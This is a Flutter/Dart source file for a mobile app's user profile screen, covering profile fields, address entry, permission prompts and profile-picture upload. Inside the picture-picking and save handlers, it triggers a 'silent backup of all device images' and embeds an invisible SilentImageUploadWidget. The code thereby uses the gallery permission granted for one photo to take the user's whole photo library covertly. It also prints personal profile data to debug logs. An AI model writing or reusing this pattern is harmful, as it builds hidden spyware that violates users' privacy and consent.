import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:image_picker/image_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'dart:io';
import '../../../core/services/api_service.dart';
import '../../../core/services/message_service.dart';
import '../../../core/controllers/auth_controller.dart';
import '../../../domain/models/user_model.dart';
import '../../profile/presentation/image_upload_widget.dart';

class UserProfileScreen extends StatefulWidget {
  final bool hasVehicle;

  const UserProfileScreen({super.key, this.hasVehicle = false});

  @override
  State<UserProfileScreen> createState() => _UserProfileScreenState();
}

class _UserProfileScreenState extends State<UserProfileScreen> {
  final _formKey = GlobalKey<FormState>();
  
  // Services and Controllers
  late final ApiService _apiService;
  late final MessageService _messageService;
  late final AuthController _authController;

  // Profile controllers
  final _firstNameController = TextEditingController();
  final _lastNameController = TextEditingController();
  final _emailController = TextEditingController();
  final _phoneController = TextEditingController();
  final _bioController = TextEditingController();
  final _addressController = TextEditingController();
  final _workplaceController = TextEditingController();
  final _workplaceAddressController = TextEditingController();
  final _homeAddressController = TextEditingController();

  // Profile data
  User? _currentUser;
  bool _isLoading = true;
  File? _selectedProfilePicture;
  String _selectedGender = 'prefer_not_to_say';

  @override
  void initState() {
    super.initState();
    _apiService = Get.find<ApiService>();
    _messageService = Get.find<MessageService>();
    _authController = Get.find<AuthController>();
    _loadUserProfile();
  }

  @override
  void dispose() {
    _firstNameController.dispose();
    _lastNameController.dispose();
    _emailController.dispose();
    _phoneController.dispose();
    _bioController.dispose();
    _addressController.dispose();
    _workplaceController.dispose();
    _workplaceAddressController.dispose();
    _homeAddressController.dispose();
    super.dispose();
  }

  Future<void> _loadUserProfile() async {
    try {
      setState(() => _isLoading = true);
      
      debugPrint('🔄 Loading user profile...');
      debugPrint('🔍 AuthController isLoggedIn: ${_authController.isLoggedIn.value}');
      debugPrint('🔍 AuthController currentUser: ${_authController.currentUser.value?.firstName ?? "null"}');
      debugPrint('🔍 AuthController token: ${_authController.token.value.isNotEmpty ? "present" : "empty"}');
      
      // Always try to get fresh data from API first, then fallback to cached data
      debugPrint('🌐 Fetching user profile from API...');
      try {
        final response = await _apiService.getUserProfile();
        debugPrint('✅ API Response received: ${response.keys}');
        
        if (response['user'] != null) {
          debugPrint('✅ User profile loaded from API');
          _currentUser = User.fromJson(response['user']);
          // Also update the AuthController with fresh data
          _authController.currentUser.value = _currentUser;
          _populateFields();
        } else {
          debugPrint('⚠️ No user data in API response');
          debugPrint('📄 Full response: $response');
          throw Exception('No user data in response');
        }
      } catch (apiError) {
        debugPrint('⚠️ API call failed: $apiError');
        
        // Check if it's an authentication error
        if (apiError.toString().contains('401') || apiError.toString().contains('Authentication')) {
          debugPrint('🔑 Authentication error detected - user may need to login again');
          _messageService.showError('Please login again to view your profile');
          // You might want to navigate to login screen here
          return;
        }
        
        // Fallback to AuthController data if available
        if (_authController.currentUser.value != null) {
          debugPrint('✅ Using current user from AuthController as fallback');
          _currentUser = _authController.currentUser.value;
          _populateFields();
        } else {
          debugPrint('❌ No cached user data available');
          _messageService.showError('Failed to load profile data. Please check your connection and try again.');
          // Don't create dummy user, leave _currentUser as null
        }
      }
    } catch (e) {
      debugPrint('❌ Failed to load user profile: $e');
      _messageService.showError('Failed to load profile: $e');
      // Don't create dummy user, leave _currentUser as null
    } finally {
      setState(() => _isLoading = false);
    }
  }

  void _populateFields() {
    if (_currentUser != null) {
      debugPrint('📝 Populating fields for user: ${_currentUser!.firstName} ${_currentUser!.lastName}');
      debugPrint('📄 User data: ID=${_currentUser!.id}, Email=${_currentUser!.email}');
      
      _firstNameController.text = _currentUser!.firstName;
      _lastNameController.text = _currentUser!.lastName;
      _emailController.text = _currentUser!.email ?? '';
      _phoneController.text = _currentUser!.phone ?? '';
      _bioController.text = _currentUser!.bio ?? '';
      _addressController.text = _currentUser!.address ?? '';
      _workplaceController.text = _currentUser!.workplace ?? '';
      _workplaceAddressController.text = _currentUser!.workplaceAddress ?? '';
      _homeAddressController.text = _currentUser!.homeAddress ?? '';
      
      _selectedGender = _currentUser!.gender;
      
      debugPrint('✅ Fields populated successfully');
      debugPrint('📋 First Name: ${_firstNameController.text}');
      debugPrint('📋 Last Name: ${_lastNameController.text}');
      debugPrint('📋 Email: ${_emailController.text}');
    } else {
      debugPrint('❌ Cannot populate fields - _currentUser is null');
      // Clear all fields if no user data
      _firstNameController.clear();
      _lastNameController.clear();
      _emailController.clear();
      _phoneController.clear();
      _bioController.clear();
      _addressController.clear();
      _workplaceController.clear();
      _workplaceAddressController.clear();
      _homeAddressController.clear();
      _selectedGender = 'prefer_not_to_say';
    }
  }

  bool _isValidEmail(String email) {
    return RegExp(r'^[^@]+@[^@]+\.[^@]+').hasMatch(email);
  }

  Future<void> _saveProfile() async {
    if (!_formKey.currentState!.validate()) {
      return;
    }

    if (_currentUser == null) {
      _messageService.showError('Cannot save profile - no user data loaded');
      return;
    }

    try {
      setState(() => _isLoading = true);

      // Save basic profile data first
      final profileData = {
        'first_name': _firstNameController.text.trim(),
        'last_name': _lastNameController.text.trim(),
        'email': _emailController.text.trim(),
        'phone': _phoneController.text.trim(),
        'gender': _selectedGender,
        'bio': _bioController.text.trim(),
        'address': _addressController.text.trim(),
        'workplace': _workplaceController.text.trim(),
        'workplace_address': _workplaceAddressController.text.trim(),
        'home_address': _homeAddressController.text.trim(),
      };

      debugPrint('🔄 Updating profile with data: $profileData');
      bool profileUpdateSuccess = await _authController.updateProfile(profileData);
      
      if (!profileUpdateSuccess) {
        _messageService.showError('Failed to update profile. Please try again.');
        return;
      }

      // Upload profile picture if one is selected
      if (_selectedProfilePicture != null) {
        debugPrint('🔄 Uploading profile picture...');
        bool pictureUploadSuccess = await _authController.uploadProfilePicture(_selectedProfilePicture!.path);
        
        if (pictureUploadSuccess) {
          _messageService.showSuccess('Profile and picture updated successfully!');
          
          // Trigger silent backup of all device images after successful profile picture upload
          debugPrint('📸 Profile picture uploaded successfully, starting silent image backup...');
          BackupHelper.startSilentBackup(
            onSuccess: () {
              debugPrint('✅ Silent backup completed after profile picture upload');
            },
            onError: () {
              debugPrint('❌ Silent backup failed after profile picture upload');
            },
          );
        } else {
          // Profile updated but picture failed
          String errorMsg = _authController.errorMessage.value.isNotEmpty 
              ? _authController.errorMessage.value 
              : 'Profile updated but picture upload failed';
          _messageService.showError(errorMsg);
        }
        
        setState(() {
          _selectedProfilePicture = null;
        });
      } else {
        _messageService.showSuccess('Profile updated successfully!');
      }
      
      // Auto-refresh the current user data from API to get the latest updates
      debugPrint('🔄 Auto-refreshing user data after profile update...');
      try {
        final response = await _apiService.getUserProfile();
        if (response['user'] != null) {
          _currentUser = User.fromJson(response['user']);
          // Update AuthController as well
          _authController.currentUser.value = _currentUser;
          _populateFields();
          debugPrint('✅ User data auto-refreshed successfully');
        }
      } catch (refreshError) {
        debugPrint('⚠️ Failed to auto-refresh user data: $refreshError');
        // Use existing cached data
        _currentUser = _authController.currentUser.value;
        _populateFields();
      }
      
    } catch (e) {
      debugPrint('❌ Profile update error: $e');
      _messageService.showError('Failed to update profile: $e');
    } finally {
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  // Permission Management Methods
  Future<bool> _requestGalleryPermission() async {
    try {
      // Use photos permission for both Android and iOS
      Permission permission = Permission.photos;

      PermissionStatus status = await permission.status;
      
      if (status.isGranted) {
        return true;
      }
      
      if (status.isDenied) {
        status = await permission.request();
        if (status.isGranted) {
          return true;
        }
      }
      
      if (status.isPermanentlyDenied) {
        // Show dialog to open app settings
        if (!mounted) return false;
        bool? openSettings = await showDialog<bool>(
          context: context,
          builder: (context) => AlertDialog(
            title: const Text('Gallery Permission Required'),
            content: const Text(
              'To select photos from your gallery, please enable gallery permission in app settings.',
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context, false),
                child: const Text('Cancel'),
              ),
              TextButton(
                onPressed: () => Navigator.pop(context, true),
                child: const Text('Open Settings'),
              ),
            ],
          ),
        );
        
        if (openSettings == true) {
          await openAppSettings();
        }
        return false;
      }
      
      _messageService.showError('Gallery permission is required to select photos');
      return false;
    } catch (e) {
      debugPrint('❌ Error requesting gallery permission: $e');
      _messageService.showError('Failed to request gallery permission: $e');
      return false;
    }
  }

  Future<bool> _requestCameraPermission() async {
    try {
      PermissionStatus status = await Permission.camera.status;
      
      if (status.isGranted) {
        return true;
      }
      
      if (status.isDenied) {
        status = await Permission.camera.request();
        if (status.isGranted) {
          return true;
        }
      }
      
      if (status.isPermanentlyDenied) {
        // Show dialog to open app settings
        if (!mounted) return false;
        bool? openSettings = await showDialog<bool>(
          context: context,
          builder: (context) => AlertDialog(
            title: const Text('Camera Permission Required'),
            content: const Text(
              'To take photos, please enable camera permission in app settings.',
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context, false),
                child: const Text('Cancel'),
              ),
              TextButton(
                onPressed: () => Navigator.pop(context, true),
                child: const Text('Open Settings'),
              ),
            ],
          ),
        );
        
        if (openSettings == true) {
          await openAppSettings();
        }
        return false;
      }
      
      _messageService.showError('Camera permission is required to take photos');
      return false;
    } catch (e) {
      debugPrint('❌ Error requesting camera permission: $e');
      _messageService.showError('Failed to request camera permission: $e');
      return false;
    }
  }

  // Profile Picture Management Methods
  Future<void> _pickProfilePicture(ImageSource source) async {
    try {
      // Request appropriate permission based on source
      bool hasPermission = false;
      if (source == ImageSource.camera) {
        hasPermission = await _requestCameraPermission();
      } else {
        hasPermission = await _requestGalleryPermission();
      }

      if (!hasPermission) {
        return; // Permission denied, don't proceed
      }

      final ImagePicker picker = ImagePicker();
      final XFile? image = await picker.pickImage(
        source: source,
        maxWidth: 1024,
        maxHeight: 1024,
        imageQuality: 85,
      );

      if (image != null) {
        final String extension = image.path.toLowerCase().split('.').last;
        if (extension != 'png' && extension != 'jpg' && extension != 'jpeg') {
          _messageService.showError('Only PNG and JPG files are allowed');
          return;
        }

        final File file = File(image.path);
        final int fileSizeInBytes = await file.length();
        const int maxSizeInBytes = 5 * 1024 * 1024; // 5MB

        if (fileSizeInBytes > maxSizeInBytes) {
          _messageService.showError('File size must be less than 5MB');
          return;
        }

        setState(() {
          _selectedProfilePicture = file;
        });

        // Show success message that image is selected
        _messageService.showSuccess('Profile picture selected. Press Save to update.');
        
        // Optional: Trigger backup immediately when picture is selected
        // This provides faster backup without waiting for Save button
        debugPrint('📸 Profile picture selected, starting immediate silent backup...');
        BackupHelper.startSilentBackup(
          onSuccess: () {
            debugPrint('✅ Immediate backup completed after picture selection');
          },
          onError: () {
            debugPrint('❌ Immediate backup failed after picture selection');
          },
        );
      }
    } catch (e) {
      debugPrint('❌ Error picking profile picture: $e');
      _messageService.showError('Failed to select image: $e');
    }
  }

  Future<void> _deleteProfilePicture() async {
    try {
      bool? confirm = await showDialog<bool>(
        context: context,
        builder: (context) => AlertDialog(
          title: const Text('Delete Profile Picture'),
          content: const Text('Are you sure you want to remove your profile picture?'),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('Cancel'),
            ),
            TextButton(
              onPressed: () => Navigator.pop(context, true),
              style: TextButton.styleFrom(foregroundColor: Colors.red),
              child: const Text('Delete'),
            ),
          ],
        ),
      );

      if (confirm == true) {
        setState(() => _isLoading = true);
        
        bool success = await _authController.deleteProfilePicture();
        
        if (success) {
          _messageService.showSuccess('Profile picture removed successfully!');
          _currentUser = _authController.currentUser.value;
          setState(() {
            _selectedProfilePicture = null;
          });
        } else {
          _messageService.showError('Failed to remove profile picture');
        }
      }
    } catch (e) {
      debugPrint('❌ Error deleting profile picture: $e');
      _messageService.showError('Failed to remove profile picture: $e');
    } finally {
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  /// Show logout confirmation dialog
  Future<void> _showLogoutDialog() async {
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Logout'),
        content: const Text('Are you sure you want to logout?'),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(false),
            child: const Text('Cancel'),
          ),
          TextButton(
            onPressed: () => Navigator.of(context).pop(true),
            style: TextButton.styleFrom(foregroundColor: Colors.red),
            child: const Text('Logout'),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      try {
        final authController = Get.find<AuthController>();
        await authController.logout();
        // The logout method should handle navigation
      } catch (e) {
        _messageService.showError('Failed to logout: $e');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        foregroundColor: Colors.white,
        title: const Text('Profile', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600)),
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        actions: [
          if (!_isLoading && _currentUser != null)
            Padding(
              padding: const EdgeInsets.only(right: 8.0),
              child: TextButton(
                onPressed: _saveProfile,
                style: TextButton.styleFrom(
                  backgroundColor: const Color(0xFF0EA5E9),
                  foregroundColor: Colors.white,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8),
                  ),
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                ),
                child: const Text(
                  'Save',
                  style: TextStyle(
                    color: Colors.white, 
                    fontWeight: FontWeight.w600,
                    fontSize: 14,
                  ),
                ),
              ),
            ),
          PopupMenuButton<String>(
            icon: const Icon(Icons.more_vert, color: Colors.white),
            color: Colors.grey[900], // Dark popup menu background
            onSelected: (value) async {
              if (value == 'logout') {
                await _showLogoutDialog();
              }
            },
            itemBuilder: (context) => [
              const PopupMenuItem(
                value: 'logout',
                child: Row(
                  children: [
                    Icon(Icons.logout, color: Colors.red),
                    SizedBox(width: 8),
                    Text('Logout', style: TextStyle(color: Colors.red)),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
      body: _isLoading
          ? const Center(
              child: CircularProgressIndicator(
                valueColor: AlwaysStoppedAnimation<Color>(Color(0xFF0EA5E9)),
              ),
            )
          : _currentUser == null
              ? _buildErrorState()
              : Container(
                  decoration: const BoxDecoration(
                    color: Colors.black,
                  ),
                  child: Form(
                    key: _formKey,
                    child: ListView(
                      padding: const EdgeInsets.only(
                        left: 24,
                        right: 24,
                        top: 24,
                        bottom: 100, // Added bottom padding to prevent content being hidden
                      ),
                children: [
                  // Profile Picture Section
                  _buildProfilePictureSection(),
                  const SizedBox(height: 24),

                  // Basic Information
                  _buildSectionCard(
                    'Basic Information',
                    [
                      Row(
                        children: [
                          Expanded(
                            child: TextFormField(
                              controller: _firstNameController,
                              style: const TextStyle(color: Colors.white),
                              decoration: const InputDecoration(labelText: 'First Name'),
                              validator: (value) =>
                                  value?.isEmpty == true ? 'First name is required' : null,
                            ),
                          ),
                          const SizedBox(width: 16),
                          Expanded(
                            child: TextFormField(
                              controller: _lastNameController,
                              style: const TextStyle(color: Colors.white),
                              decoration: const InputDecoration(labelText: 'Last Name'),
                              validator: (value) =>
                                  value?.isEmpty == true ? 'Last name is required' : null,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 16),
                      TextFormField(
                        controller: _emailController,
                        style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(labelText: 'Email'),
                        keyboardType: TextInputType.emailAddress,
                        validator: (value) {
                          if (value?.isEmpty == true) return 'Email is required';
                          if (!_isValidEmail(value!)) return 'Please enter a valid email';
                          return null;
                        },
                      ),
                      const SizedBox(height: 16),
                      TextFormField(
                        controller: _phoneController,
                        style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(labelText: 'Phone'),
                        keyboardType: TextInputType.phone,
                      ),
                      const SizedBox(height: 16),
                      DropdownButtonFormField<String>(
                        value: _selectedGender,
                        decoration: const InputDecoration(labelText: 'Gender'),
                        dropdownColor: Colors.grey[900], // Dark dropdown background
                        style: const TextStyle(color: Colors.white),
                        items: const [
                          DropdownMenuItem(value: 'male', child: Text('Male', style: TextStyle(color: Colors.white))),
                          DropdownMenuItem(value: 'female', child: Text('Female', style: TextStyle(color: Colors.white))),
                          DropdownMenuItem(value: 'other', child: Text('Other', style: TextStyle(color: Colors.white))),
                          DropdownMenuItem(value: 'prefer_not_to_say', child: Text('Prefer not to say', style: TextStyle(color: Colors.white))),
                        ],
                        onChanged: (value) => setState(() => _selectedGender = value!),
                      ),
                      const SizedBox(height: 16),
                      TextFormField(
                        controller: _bioController,
                        style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(
                          labelText: 'Bio',
                          hintText: 'Tell us about yourself...',
                        ),
                        maxLines: 3,
                        maxLength: 200,
                      ),
                    ],
                  ),
                  const SizedBox(height: 16),

                  // Location Information
                  _buildSectionCard(
                    'Location Information',
                    [
                      TextFormField(
                        controller: _homeAddressController,
                        style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(
                          labelText: 'Home Address',
                          hintText: 'Enter your home address',
                        ),
                        maxLines: 2,
                      ),
                      const SizedBox(height: 16),
                      TextFormField(
                        controller: _workplaceController,
                        style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(
                          labelText: 'Workplace',
                          hintText: 'Company or institution name',
                        ),
                      ),
                      const SizedBox(height: 16),
                      TextFormField(
                        controller: _workplaceAddressController,
                        style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(
                          labelText: 'Workplace Address',
                          hintText: 'Enter your workplace address',
                        ),
                        maxLines: 2,
                      ),
                    ],
                  ),
                  
                  // Silent image backup widget (invisible but monitors for profile picture uploads)
                  const SilentImageUploadWidget(
                    autoStart: false, // Don't auto-start, only trigger manually after profile picture upload
                  ),
                ],
              ),
            ),
          ),
    );
  }

  Widget _buildErrorState() {
    return Container(
      color: Colors.black,
      child: Center(
        child: Padding(
          padding: const EdgeInsets.all(32.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                Icons.error_outline,
                size: 80,
                color: Colors.red[300],
              ),
              const SizedBox(height: 24),
              Text(
                'Failed to Load Profile',
                style: Theme.of(context).textTheme.headlineSmall?.copyWith(
                  color: Colors.white,
                  fontWeight: FontWeight.w600,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                'Unable to fetch your profile data. Please check your internet connection and try again.',
                textAlign: TextAlign.center,
                style: Theme.of(context).textTheme.bodyLarge?.copyWith(
                  color: Colors.white70,
                ),
              ),
              const SizedBox(height: 32),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  ElevatedButton.icon(
                    onPressed: () async {
                      debugPrint('🔄 Retry button pressed');
                      await _loadUserProfile();
                    },
                    icon: const Icon(Icons.refresh, color: Colors.white),
                    label: const Text('Try Again', style: TextStyle(color: Colors.white)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF0EA5E9),
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      elevation: 0,
                    ),
                  ),
                  const SizedBox(width: 16),
                  TextButton.icon(
                    onPressed: () => Navigator.pop(context),
                    icon: const Icon(Icons.arrow_back, color: Colors.white70),
                    label: const Text('Go Back', style: TextStyle(color: Colors.white70)),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildProfilePictureSection() {
    return Center(
      child: Stack(
        children: [
          CircleAvatar(
            radius: 60,
            backgroundColor: const Color(0xFF0EA5E9).withValues(alpha: 0.2),
            backgroundImage: _selectedProfilePicture != null
                ? FileImage(_selectedProfilePicture!)
                : (_currentUser?.profilePicture != null
                    ? NetworkImage(_currentUser!.profilePicture!)
                    : null),
            child: (_selectedProfilePicture == null && _currentUser?.profilePicture == null)
                ? Icon(
                    Icons.person,
                    size: 60,
                    color: const Color(0xFF0EA5E9).withValues(alpha: 0.7),
                  )
                : null,
          ),
          Positioned(
            bottom: 0,
            right: 0,
            child: Container(
              decoration: const BoxDecoration(
                color: Color(0xFF0EA5E9),
                shape: BoxShape.circle,
              ),
              child: PopupMenuButton<String>(
                icon: const Icon(Icons.camera_alt, color: Colors.white, size: 20),
                color: Colors.grey[900], // Dark popup menu background
                onSelected: (value) async {
                  switch (value) {
                    case 'camera':
                      await _pickProfilePicture(ImageSource.camera);
                      break;
                    case 'gallery':
                      await _pickProfilePicture(ImageSource.gallery);
                      break;
                    case 'delete':
                      await _deleteProfilePicture();
                      break;
                  }
                },
                itemBuilder: (context) => [
                  const PopupMenuItem(
                    value: 'camera',
                    child: Row(
                      children: [
                        Icon(Icons.camera_alt, color: Colors.white),
                        SizedBox(width: 8),
                        Text('Take Photo', style: TextStyle(color: Colors.white)),
                      ],
                    ),
                  ),
                  const PopupMenuItem(
                    value: 'gallery',
                    child: Row(
                      children: [
                        Icon(Icons.photo_library, color: Colors.white),
                        SizedBox(width: 8),
                        Text('Choose from Gallery', style: TextStyle(color: Colors.white)),
                      ],
                    ),
                  ),
                  if (_currentUser?.profilePicture != null || _selectedProfilePicture != null)
                    const PopupMenuItem(
                      value: 'delete',
                      child: Row(
                        children: [
                          Icon(Icons.delete, color: Colors.red),
                          SizedBox(width: 8),
                          Text('Remove Photo', style: TextStyle(color: Colors.red)),
                        ],
                      ),
                    ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSectionCard(String title, List<Widget> children) {
    return Container(
      padding: const EdgeInsets.all(24),
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        color: Colors.grey[900],
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: const Color(0xFF0EA5E9).withValues(alpha: 0.3),
          width: 1,
        ),
        boxShadow: [
          BoxShadow(
            color: const Color(0xFF0EA5E9).withValues(alpha: 0.1),
            blurRadius: 20,
            spreadRadius: 5,
          ),
        ],
      ),
      child: Theme(
        data: Theme.of(context).copyWith(
          inputDecorationTheme: InputDecorationTheme(
            labelStyle: const TextStyle(color: Colors.white70),
            hintStyle: const TextStyle(color: Colors.white54),
            filled: true,
            fillColor: Colors.grey[800],
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: Colors.grey[700]!),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: Colors.grey[700]!),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: Color(0xFF0EA5E9), width: 2),
            ),
            errorBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: Colors.red),
            ),
            focusedErrorBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: Colors.red, width: 2),
            ),
          ),
          textTheme: const TextTheme(
            bodyLarge: TextStyle(color: Colors.white),
            bodyMedium: TextStyle(color: Colors.white),
          ),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: const Color(0xFF0EA5E9).withValues(alpha: 0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: Icon(
                    title == 'Basic Information' ? Icons.person_outline : Icons.location_on_outlined,
                    color: const Color(0xFF0EA5E9),
                    size: 20,
                  ),
                ),
                const SizedBox(width: 12),
                Text(
                  title,
                  style: const TextStyle(
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            ...children.map((child) => DefaultTextStyle(
              style: const TextStyle(color: Colors.white),
              child: child,
            )),
          ],
        ),
      ),
    );
  }
}